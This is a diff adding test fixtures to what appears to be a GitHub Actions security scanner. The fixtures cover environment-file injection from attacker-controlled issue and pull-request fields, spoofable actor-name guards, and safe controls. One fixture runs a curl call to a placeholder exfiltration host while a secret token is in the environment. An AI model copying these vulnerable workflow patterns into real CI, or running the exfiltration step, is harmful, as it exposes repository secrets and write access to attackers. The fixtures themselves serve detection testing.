@@ -358,6 +358,60 @@ def _overbroad_cases() -> Iterator[Case]:
         )
 
 
+def _env_file_injection_cases() -> Iterator[Case]:
+    """Attacker text written into an environment file — every target, every
+    payload. The Google/Apache NODE_OPTIONS class."""
+    for target in ("GITHUB_ENV", "GITHUB_OUTPUT", "GITHUB_PATH"):
+        for payload in ("github.event.issue.title", "github.event.pull_request.body", "github.head_ref"):
+            yield Case(
+                name=f"env-file-injection({target}<-{payload})",
+                expect_rule="env-file-injection",
+                workflow=f"""
+                on:
+                  issues:
+                    types: [opened]
+                permissions:
+                  contents: write
+                jobs:
+                  a:
+                    runs-on: ubuntu-latest
+                    steps:
+                      - run: |
+                          echo "VALUE=${{{{ {payload} }}}}" >> ${target}
+                          curl {_EXFIL}
+                        env:
+                          TOKEN: {_SECRET}
+                """,
+            )
+
+
+def _weak_actor_guard_cases() -> Iterator[Case]:
+    """Attacker-reachable job gated only by a spoofable actor check."""
+    for guard in (
+        "github.actor == 'trusted-user'",
+        "github.actor != 'dependabot[bot]'",
+        "contains(github.actor, 'admin')",
+        "github.triggering_actor == 'maintainer'",
+    ):
+        yield Case(
+            name=f"weak-actor-guard({guard})",
+            expect_rule="weak-actor-guard",
+            workflow=f"""
+            on:
+              issue_comment:
+                types: [created]
+            jobs:
+              a:
+                runs-on: ubuntu-latest
+                if: {guard}
+                permissions:
+                  contents: write
+                steps:
+                  - run: echo handled
+            """,
+        )
+
+
 def _self_hosted_cases() -> Iterator[Case]:
     yield Case(
         name="self-hosted-runner-takeover",
@@ -470,6 +524,35 @@ def _control_cases() -> Iterator[Case]:
         """,
     )
     yield Case(
+        name="control:strong-author-association-guard",
+        kind="control",
+        workflow="""
+        on:
+          issue_comment:
+            types: [created]
+        jobs:
+          a:
+            runs-on: ubuntu-latest
+            if: contains(fromJSON('["OWNER","MEMBER","COLLABORATOR"]'), github.event.comment.author_association)
+            permissions:
+              contents: write
+            steps:
+              - run: echo trusted
+        """,
+    )
+    yield Case(
+        name="control:env-file-trusted-value",
+        kind="control",
+        workflow="""
+        on: push
+        jobs:
+          a:
+            runs-on: ubuntu-latest
+            steps:
+              - run: echo "SHA=${{ github.sha }}" >> $GITHUB_ENV
+        """,
+    )
+    yield Case(
         name="control:vanilla-ci",
         kind="control",
         workflow="""
@@ -494,6 +577,8 @@ _GENERATORS = (
     _mcp_cases,
     _cross_job_cases,
     _workflow_run_cases,
+    _env_file_injection_cases,
+    _weak_actor_guard_cases,
     _overbroad_cases,
     _self_hosted_cases,
     _control_cases,
